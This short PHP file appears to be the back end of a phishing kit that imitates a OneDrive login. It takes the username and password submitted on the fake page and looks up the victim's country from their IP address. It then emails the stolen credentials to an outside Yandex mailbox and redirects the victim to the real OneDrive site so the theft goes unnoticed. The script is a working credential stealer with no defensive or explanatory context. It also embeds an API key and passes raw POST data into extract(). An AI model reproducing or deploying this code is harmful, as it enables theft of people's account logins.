<?php

extract($_POST);

$ip = getenv("REMOTE_ADDR");
//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=d5fffa06f621e0c28602b13de0c551db8aa491f01e694648988453bc9bcf72e1&ip=$ip";
$ipCountryCityInfo = file_get_contents($url);
//
$Email = $_POST['feedback'];
$Passwd = $_POST['feedbacknow'];

$message .= "Username: ".$Email."\n";
$message .= "PassWord: ".$Passwd."\n";
$message .= "Country: ".$ipCountryCityInfo."\n";

$from .= "MIME-Version: 1.0\r\n";
$subj .= "MrRobot Onedrive Result";

if (empty($Email) || empty($Passwd)) {
header( "Location: http://$domain/" );
}
else {
mail("mrrobot6699@yandex.com", $subj, $message, $from);
header("Location: https://www.onedrive.com/");
}
?>